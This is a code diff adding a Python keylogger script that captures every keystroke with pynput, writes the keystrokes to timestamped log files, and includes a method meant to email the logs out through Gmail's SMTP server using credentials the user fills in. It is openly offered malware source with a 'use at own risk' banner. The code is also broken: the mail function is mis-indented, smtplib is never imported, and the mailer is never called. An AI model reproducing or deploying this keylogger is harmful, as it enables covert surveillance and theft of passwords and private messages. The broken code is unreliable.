@@ -1,0 +1,63 @@
+'''
+File: Keylogger.py
+Author: Daniel Krilich
+Description: A basic keylogger for Python and emails it 
+Delivery Method: Change line 49 to your email/password
+~~~~~~~~WARNING~~~~~~~~USE AT OWN~~~~~~~~RISK~~~~~~~~~~~
+'''
+
+from pynput.keyboard import Key, Listener
+import logging
+import os
+from datetime import datetime
+
+print('******'* 5)
+print('USE AT OWN RISK', '\nAll actions are your own')
+print('******'* 5)
+
+class Keylogger:
+        
+    def create_log_directory(self):
+        sub_dir = "log"
+        cwd = os.getcwd()
+        self.log_dir = os.path.join(cwd,sub_dir)
+        if not os.path.exists(sub_dir):
+            os.mkdir(sub_dir)
+    
+    
+    @staticmethod
+    def on_press(key):
+        try:
+            logging.info(str(key))
+        except Exception as e:
+            logging.info(e)
+        
+            
+    def write_log_file(self):
+        # time format example: '2021-05-29-171747'
+        time = str(datetime.now())[:-7].replace(" ", "-").replace(":", "")
+        # logging info in the file
+        logging.basicConfig(
+                 filename=(os.path.join(self.log_dir, time) + "-log.txt"),
+                 level=logging.DEBUG, 
+                 format= '[%(asctime)s]: %(message)s',
+             )
+        
+        with Listener(on_press=self.on_press) as listener:
+            listener.join()
+          
+        def send_mail(self, email, password, TO, msg):
+        with smtplib.SMTP("smtp.gmail.com", 587) as server:
+            try:
+                server.starttls()    # enable secure TLS mode
+                server.login(email, password)
+                server.sendmail(email, TO, msg)
+            except Exception as e:
+                pass
+            finally:
+                server.quit()
+
+if __name__ == "__main__":
+    klog = Keylogger()
+    klog.create_log_directory()
+    klog.write_log_file()
